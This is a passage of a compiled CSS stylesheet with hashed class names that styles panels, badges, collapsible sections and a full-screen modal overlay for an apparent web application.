        background: rgba(0, 0, 0, 0.05)
    }

    ._3mcCwgfKRlr_taUmChcraA .NNgyZW0jeoBcuylNDJEUx ._2HMikoJ4IkZOXVhOxz5QqM {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._3mcCwgfKRlr_taUmChcraA .NNgyZW0jeoBcuylNDJEUx ._2HMikoJ4IkZOXVhOxz5QqM ._29tQMeoBKRbtSCjjA3208V span {
        display: inline-flex;
        font-size: 14px
    }

    ._3mcCwgfKRlr_taUmChcraA ._3xOry1ajfLxT5Y2JryMZz1 {
        font-size: 20px;
        font-weight: 600;
        color: var(--ah-black-200);
        text-transform: uppercase
    }

    ._3mcCwgfKRlr_taUmChcraA ._3w-bWBZhjGSj_YmprmIIjA {
        display: flex;
        align-items: center;
        justify-content: flex-end;
        margin-bottom: 15px
    }

    ._3mcCwgfKRlr_taUmChcraA ul._2VGDVX37tAL8iyGNdP4GdC {
        display: flex;
        list-style: none;
        padding: 0;
        margin: 0
    }

    ._3mcCwgfKRlr_taUmChcraA ul._2VGDVX37tAL8iyGNdP4GdC li {
        margin-right: 35px
    }

    ._3mcCwgfKRlr_taUmChcraA ul._2VGDVX37tAL8iyGNdP4GdC li:last-child {
        margin-right: 0
    }

    ._3mcCwgfKRlr_taUmChcraA ._16t_zJw2rMr8oYf1vMeQxS {
        display: flex;
        align-items: center
    }

    ._3mcCwgfKRlr_taUmChcraA ._16t_zJw2rMr8oYf1vMeQxS div {
        margin: 0 4px;
        color: var(--ah-grey-100)
    }

    ._3mcCwgfKRlr_taUmChcraA ._3h-e8yODkuW0_vFj7OJyk {
        width: 1px;
        height: 40px;
        background-color: var(--ah-grey-700)
    }

    ._3mcCwgfKRlr_taUmChcraA .mVmhr_n86jp8nwI-NJsKP ._1D0D0-6CZABMVJfGVfgtnG {
        font-weight: bold;
        color: var(--ah-grey-100)
    }

    ._3mcCwgfKRlr_taUmChcraA .mVmhr_n86jp8nwI-NJsKP ._29MXxkp9BcPnckyUHGM7ya {
        color: var(--ah-primary)
    }

    ._3_i9uN0F36u55tBi_Wvqnv {
        padding: 32px 0
    }

    ._3_i9uN0F36u55tBi_Wvqnv .my0V6aT4wf7HN4DUm_G_O {
        height: 230px;
        position: relative
    }

    ._3_i9uN0F36u55tBi_Wvqnv ._2Vm88w3oeJxm3pO_4PSlP {
        height: 100% !important
    }

    ._3KL6PI0zVvHv3TPa-SLJ8H._3DF1WNYcA7z4M9-C7Lh4Qx {
        box-sizing: border-box;
        border-radius: 8px;
        margin-bottom: 10px
    }

    ._3KL6PI0zVvHv3TPa-SLJ8H ._2w0PZLdze_YzSHfHU2Lzyu {
        font-size: 20px;
        font-weight: 600;
        color: var(--ah-black-200);
        text-transform: uppercase
    }

    ._3KL6PI0zVvHv3TPa-SLJ8H ._26F0gFUbr9iUwqe8iMA_XF {
        font-weight: 700;
        color: var(--ah-grey-100);
        font-size: 12px;
        margin-bottom: 1px
    }

    ._3KL6PI0zVvHv3TPa-SLJ8H ._1yxBvGUuorUJDtvkesonwr {
        color: var(--ah-grey-300)
    }

    ._2eHi7Hfs4bJ59Foilf3ixR {
        position: relative !important;
        margin-top: 15px;
        background: rgba(0, 0, 0, 0.05)
    }

    ._2eHi7Hfs4bJ59Foilf3ixR ._2kJf4KHrw7di_6OgCAaxKi {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._2eHi7Hfs4bJ59Foilf3ixR ._2kJf4KHrw7di_6OgCAaxKi ._1nHV7r270mD2Fv9USTqVv- span {
        display: inline-flex;
        font-size: 14px
    }

    ._3fIyaTKzgM5yi4v_uFtJj {
        padding: 32px 0
    }

    ._3fIyaTKzgM5yi4v_uFtJj ._2wuWKSK9ShZfeXKNnl8HkG {
        position: relative
    }

    ._3fIyaTKzgM5yi4v_uFtJj .lVQH5tfxm_B_pYjSSA-eg {
        height: 100% !important
    }

    ._2TXzc88bgeNjtcp-Zelc14._3wk8EGnDXG5cVoD5OLAFlr {
        border: 1px solid #f5f5f5;
        box-sizing: border-box;
        border-radius: 8px;
        margin-bottom: 16px
    }

    ._2TXzc88bgeNjtcp-Zelc14 ._3k3vCacbgVk0eaJo5Thkd {
        display: flex;
        align-items: center;
        justify-content: space-between;
        min-height: 48px;
        padding: 0 16px;
        cursor: pointer;
        user-select: none
    }

    ._2TXzc88bgeNjtcp-Zelc14 ._3k3vCacbgVk0eaJo5Thkd * {
        cursor: pointer;
        user-select: none
    }

    ._2TXzc88bgeNjtcp-Zelc14 ._3k3vCacbgVk0eaJo5Thkd:hover {
        background-color: #f5f5f5
    }

    ._2TXzc88bgeNjtcp-Zelc14 .MiaviscLJDFlvU4jzdKeB {
        font-size: 12px;
        line-height: 16px;
        color: var(--ah-grey-100)
    }

    ._2TXzc88bgeNjtcp-Zelc14 ._2L0a5E0RfbrVSkU_8JEY-W {
        width: 12px;
        height: 12px;
        display: flex;
        align-items: center;
        justify-content: center
    }

    ._2TXzc88bgeNjtcp-Zelc14 ._2L0a5E0RfbrVSkU_8JEY-W._3Tvr9-8LeEBmnPYhQEyOwc {
        transform: rotate(90deg)
    }

    ._2TXzc88bgeNjtcp-Zelc14 ._3TvvxV9XTSTBloD3zp_y5V {
        border-radius: 30px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        padding: 4px 16px;
        border: solid 1px #ccc;
        color: var(--ah-grey-100)
    }

    ._2TXzc88bgeNjtcp-Zelc14 ._3TvvxV9XTSTBloD3zp_y5V svg {
        margin-right: 6px
    }

    ._2TXzc88bgeNjtcp-Zelc14 ._3TvvxV9XTSTBloD3zp_y5V[data-badge-union-color='danger'] {
        background-color: #fde8ea;
        border-color: #fde8ea
    }

    ._2TXzc88bgeNjtcp-Zelc14 ._3TvvxV9XTSTBloD3zp_y5V[data-badge-union-color='success'] {
        background-color: #e9f6f2;
        border-color: #e9f6f2
    }

    ._2TXzc88bgeNjtcp-Zelc14 ._3TvvxV9XTSTBloD3zp_y5V[data-badge-union-color='success'] svg path {
        fill: var(--ah-green-300)
    }

    ._2TXzc88bgeNjtcp-Zelc14 ._5Nb2sx8i1mIWl2FDv0ddq {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 24px
    }

    ._2TXzc88bgeNjtcp-Zelc14 ._5Nb2sx8i1mIWl2FDv0ddq ._3CY_4_xCWi1BnGbIUSJDsl {
        margin-right: 16px
    }

    ._2TXzc88bgeNjtcp-Zelc14 ._5Nb2sx8i1mIWl2FDv0ddq ._3CY_4_xCWi1BnGbIUSJDsl:last-child {
        margin-right: 0
    }

    ._10DEtGWFY7ImbD_faAOl5b {
        padding: 32px 0;
        padding-bottom: 0
    }

    ._10DEtGWFY7ImbD_faAOl5b .neWf0KHcD31OiXE7GBWZl {
        height: 230px;
        position: relative
    }

    ._10DEtGWFY7ImbD_faAOl5b ._1R3uqNi3x1ff3jJax1RdzB {
        height: 100% !important
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 2147483647;
        display: none
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr._2mkn1CHtQCoS0lKXPjdhc9 {
        display: block
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._jkT6UkdjQyD-lSfBdMw_ {
        display: flex;
        align-items: center
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1t0rdDIgjtaunuVLakejLz {
        width: 100%
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb {
        opacity: 1;
        visibility: visible;
        transition: 0.3s;
        z-index: 2147483647
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._1U0pmr3kCIJ_k2dOqTwtv4 {
        background: #000000;
        border-radius: 0px 0px 12px 12px;
        font-weight: 700;
        font-size: 28px;
        line-height: 38px;
        letter-spacing: -0.01em;
        color: #ffffff;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 56px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._1U0pmr3kCIJ_k2dOqTwtv4>div {
        color: #ffffff;
        font-weight: 700;
        font-size: 28px;
        line-height: 38px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._1U0pmr3kCIJ_k2dOqTwtv4 .y1hRP05DyKXQjn4ahirmp {
        position: relative;
        background: #ffffff;
        border-radius: 4px;
        font-weight: 600;
        font-size: 18px;
        line-height: 24px;
        display: flex;
        align-items: center;
        text-align: center;
        color: #000000;
        padding: 4px 16px;
        margin-left: 16px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._1U0pmr3kCIJ_k2dOqTwtv4 .y1hRP05DyKXQjn4ahirmp:before {
        content: '';
        border-right: solid 5px #fff;
        border-top: solid 5px transparent;
        border-bottom: solid 5px transparent;
        position: absolute;
        right: 100%
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u {
        text-align: center;
        position: relative;
        position: fixed;
        top: 50%;
        left: 50%;
        bottom: 0;
        background: #fff;
        z-index: 2147483647;
        width: 670px;
        transform: translate(-50%, -50%);
        height: fit-content;
        border-radius: 12px;
        transition: 0.3s
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._2F1M2Q14NJeG7sKDNG8a_7:before {
        content: '';
        display: block;
        height: 2px;
        width: 160px;
        background: #000;
        position: absolute;
        margin-top: 2px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._2czfJdCuxZ8KjYa8flzMqR:before {
        content: '';
        display: block;
        height: 2px;
        width: 150px;
        background: #000;
        position: absolute;
        margin-top: 4px;
        margin-left: -4px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._9L5jPgUvICrjdt52Lnpwb {
        overflow-y: auto;
        overflow-x: hidden;
        max-height: calc(100vh - 10px);
        box-sizing: border-box;
        border-radius: 0 0 12px 12px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._3NH1HrYzHhJ-Mirrdex65y {
        position: absolute;
        right: -36px;
        top: 4px;
        cursor: pointer
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._3NH1HrYzHhJ-Mirrdex65y svg {
        max-width: 20px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._3gArNFusEAoaUPbxg4-Nno {
        margin: auto;
        margin-top: 45px;
        margin-bottom: 45px;
        max-width: 320px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._3gArNFusEAoaUPbxg4-Nno ._2NM6nl77fngaUJlxUcjkP_ {
        display: flex;
        align-items: center;
        justify-content: center
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._3gArNFusEAoaUPbxg4-Nno ._2NM6nl77fngaUJlxUcjkP_>span {
        font-weight: 700;
        font-size: 40px;
        line-height: 38px;
        letter-spacing: -0.01em;
        color: #7b7b7b
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._3gArNFusEAoaUPbxg4-Nno ._2NM6nl77fngaUJlxUcjkP_ ._3AAHkhz6oTC0faz6KFtElF {
        font-weight: 500;
        font-size: 14px;
        line-height: 22px;
        color: #7b7b7b
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._3gArNFusEAoaUPbxg4-Nno ._8KR33HbQxFGClkLjZVi0S {
        border: 1px dashed #d9d9d9;
        margin: 18px 0;
        position: relative
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._3gArNFusEAoaUPbxg4-Nno ._8KR33HbQxFGClkLjZVi0S svg {
        position: absolute;
        top: 50%;
        transform: translate(-50%, -50%);
        background: #fff;
        left: 50%;
        width: 28px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._3gArNFusEAoaUPbxg4-Nno .dS_oq0y565Q6Xy9GHiaRw {
        position: relative;
        font-weight: 700;
        font-size: 88px;
        line-height: 90%;
        letter-spacing: -0.01em;
        color: #000000;
        display: flex;
        align-items: center
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._3gArNFusEAoaUPbxg4-Nno .dS_oq0y565Q6Xy9GHiaRw ._1e4ogKUrNj4r_09sDJTSTl {
        font-weight: 500;
        font-size: 14px;
        line-height: 22px;
        background: #000;
        color: #fff;
        transform: rotate(-90deg);
        height: 26px;
        width: 80px;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 16px;
        margin-right: -20px;
        margin-left: -20px;
        letter-spacing: 0.3px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._3gArNFusEAoaUPbxg4-Nno .dS_oq0y565Q6Xy9GHiaRw ._3AAHkhz6oTC0faz6KFtElF {
        font-weight: 500;
        font-size: 16px;
        line-height: 22px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._3gArNFusEAoaUPbxg4-Nno .dS_oq0y565Q6Xy9GHiaRw ._1OnWe3qwFUTvAb31ZnnYES {
        font-weight: 700;
        font-size: 88px;
        line-height: 90%;
        letter-spacing: -0.01em;
        color: #000
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._3gArNFusEAoaUPbxg4-Nno .dS_oq0y565Q6Xy9GHiaRw ._3AAHkhz6oTC0faz6KFtElF {
        font-weight: 500;
        font-size: 14px;
        line-height: 22px;
        position: absolute;
        right: 0;
        top: 10px;
        color: #000
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._3gArNFusEAoaUPbxg4-Nno .dS_oq0y565Q6Xy9GHiaRw ._3AAHkhz6oTC0faz6KFtElF._2PSkGBuC9cftl2osgVQ04k {
        right: -34px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._395f1jPsF94-emLuqKA0-9 {
        width: 100%;
        max-width: 320px;
        margin: auto;
        font-weight: 500;
        font-size: 16px;
        line-height: 24px;
        border-radius: 6px;
        background-color: #f32539;
        color: #fff;
        height: 50px;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        transition: 0.3s
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._395f1jPsF94-emLuqKA0-9:hover {
        opacity: 0.9
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._1ahkvfmNgbKq17ezaZrmS5 {
        max-height: 0;
        overflow: hidden;
        transition: 0.5s;
        background: #f5f5f5;
        padding: 0 192px;
        text-align: left;
        color: #000000
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._1ahkvfmNgbKq17ezaZrmS5.ghKmtSeV-Sefez4RVQaHm {
        max-height: 300px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._1ahkvfmNgbKq17ezaZrmS5.ghKmtSeV-Sefez4RVQaHm._1p0G_xnVYcifoARzQb7_R3 {
        max-height: 360px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._1ahkvfmNgbKq17ezaZrmS5>div {
        padding-top: 20px;
        padding-bottom: 36px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._1ahkvfmNgbKq17ezaZrmS5>div .Seq-BKkE3aWyaEj2EJb61 {
        font-weight: 500;
        font-size: 16px;
        line-height: 22px;
        color: #000000;
        margin-bottom: 12px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._1ahkvfmNgbKq17ezaZrmS5>div ._2BPe-WU9ES0w0PLZVKpRoL {
        font-size: 30px;
        display: flex;
        align-items: center
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._1ahkvfmNgbKq17ezaZrmS5>div ._2BPe-WU9ES0w0PLZVKpRoL>div {
        font-size: 30px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._1ahkvfmNgbKq17ezaZrmS5>div ._2BPe-WU9ES0w0PLZVKpRoL b {
        font-size: 40px;
        margin-left: 8px;
        vertical-align: middle;
        font-weight: 700;
        color: #000
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._1ahkvfmNgbKq17ezaZrmS5>div ul {
        margin-bottom: 0;
        margin-left: 16px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._1ahkvfmNgbKq17ezaZrmS5>div ul li {
        font-weight: 400;
        font-size: 12px;
        line-height: 18px;
        color: #434343;
        display: flex
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._1ahkvfmNgbKq17ezaZrmS5>div ul li:before {
        content: '';
        display: inline-block;
        width: 4px;
        height: 4px;
        min-width: 4px;
        background: #000;
        border-radius: 50%;
        margin-right: 8px;
        margin-top: 7px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._1ahkvfmNgbKq17ezaZrmS5 ._1NEx3KiAazRaL110IooGIR {
        display: flex;
        align-items: center
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._1ahkvfmNgbKq17ezaZrmS5 ._1NEx3KiAazRaL110IooGIR span {
        font-size: 16px;
        font-weight: 500;
        color: #2e2e2e
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._1ahkvfmNgbKq17ezaZrmS5 ._1NEx3KiAazRaL110IooGIR ._16D7ze3Bb_7ZTHAhDWBttK {
        margin-right: 10px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._1ahkvfmNgbKq17ezaZrmS5 ._2eQGacg2JR6ojOe-N3QcCT {
        margin: 20px 0;
        border-top: 1px solid #d5d5d5
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u .aEjeOUw05QgqsAeMkZt-y {
        font-weight: 400;
        font-size: 14px;
        line-height: 22px;
        color: #000000;
        cursor: pointer;
        text-align: center;
        display: inline-flex;
        align-items: center;
        width: 100%;
        justify-content: center;
        color: #2e2e2e;
        background: #f5f5f5;
        border-radius: 0 0 12px 12px;
        padding: 12px 0;
        border-top: 1px solid #d5d5d5
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u .aEjeOUw05QgqsAeMkZt-y svg {
        margin-left: 8px;
        color: #9d9d9d;
        height: 14px !important
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u b {
        font-weight: 700
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._2lQBPzk_a-5_S7hhTcUPDE {
        text-align: center
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._2lQBPzk_a-5_S7hhTcUPDE .fLvcbQuc460ln-KIZG2vf {
        position: absolute;
        left: -37px;
        top: -37px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._2lQBPzk_a-5_S7hhTcUPDE ._35o8DgFNJJnEBqn0hPYMOB {
        text-align: center
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._2lQBPzk_a-5_S7hhTcUPDE ._35o8DgFNJJnEBqn0hPYMOB img {
        margin: auto;
        margin-bottom: 40px;
        margin-top: 50px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._2lQBPzk_a-5_S7hhTcUPDE ._2NM6nl77fngaUJlxUcjkP_ {
        font-weight: 700;
        font-size: 80px;
        line-height: 90%;
        letter-spacing: -0.01em;
        color: #000000;
        display: flex;
        align-items: center;
        justify-content: center;
        margin-bottom: 10px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._2lQBPzk_a-5_S7hhTcUPDE ._2NM6nl77fngaUJlxUcjkP_ ._1OnWe3qwFUTvAb31ZnnYES {
        font-weight: 700;
        font-size: 32px;
        line-height: 38px;
        letter-spacing: -0.01em;
        color: #7b7b7b
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._2lQBPzk_a-5_S7hhTcUPDE ._2NM6nl77fngaUJlxUcjkP_ ._3AAHkhz6oTC0faz6KFtElF {
        font-weight: 500;
        font-size: 14px;
        line-height: 22px;
        color: #7b7b7b
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._2lQBPzk_a-5_S7hhTcUPDE ._2NM6nl77fngaUJlxUcjkP_ ._1e4ogKUrNj4r_09sDJTSTl {
        width: 94px;
        height: 30px;
        background: #000000;
        border-radius: 4px;
        color: #fff;
        font-weight: 600;
        font-size: 12px;
        line-height: 18px;
        display: flex;
        align-items: center;
        justify-content: center;
        margin-right: 12px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._2lQBPzk_a-5_S7hhTcUPDE .dS_oq0y565Q6Xy9GHiaRw {
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: 700;
        font-size: 32px;
        line-height: 38px;
        letter-spacing: -0.01em;
        color: #9d9d9d;
        margin-bottom: 32px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._2lQBPzk_a-5_S7hhTcUPDE .dS_oq0y565Q6Xy9GHiaRw ._3AAHkhz6oTC0faz6KFtElF {
        font-weight: 500;
        font-size: 16px;
        line-height: 22px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._2lQBPzk_a-5_S7hhTcUPDE .dS_oq0y565Q6Xy9GHiaRw ._1OnWe3qwFUTvAb31ZnnYES {
        font-weight: 700;
        font-size: 80px;
        line-height: 90%;
        letter-spacing: -0.01em;
        color: #000
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._2lQBPzk_a-5_S7hhTcUPDE .H-WvosaPf4GV0nrebUac2 {
        font-weight: 700;
        font-size: 24px;
        line-height: 34px;
        display: flex;
        align-items: center;
        justify-content: center;
        color: #555555;
        margin-bottom: 36px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._2lQBPzk_a-5_S7hhTcUPDE .H-WvosaPf4GV0nrebUac2>div {
        font-weight: 700;
        font-size: 24px;
        line-height: 34px;
        color: #555555
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._261rqO8iSlJRIGv4KV1B1B {
        margin-top: 14px;
        text-align: center;
        padding-bottom: 30px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3z6NnsHzBHz-xITPMfpB1u ._261rqO8iSlJRIGv4KV1B1B span {
        display: inline-block;
        margin-left: 5px
    }

    ._1KoU3O7KmbdYchdTsvyCqW .G06dB0HldS1ERO73DFcYr ._1DlJEa_dCfHxC8wnjQPfgb ._3CfjzYUhSC-fkZe7IPyBqk {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.75);
        z-index: 9999999999;
        transition: 0.3s
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._1HzRBTVxmaVT3Zi0Iflw3m {
        position: relative;
        background-color: #fff;
        z-index: 1;
        border-radius: 10px 10px 0 0;
        max-height: calc(100vh - 30px - var(--ah-height-nav));
        min-height: 500px;
        height: 100vh
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._1HzRBTVxmaVT3Zi0Iflw3m ._2v54Znk7D_4ivN2s0Jk9mx {
        padding: 0 20px;
        padding-bottom: 12px;
        position: relative;
        display: flex;
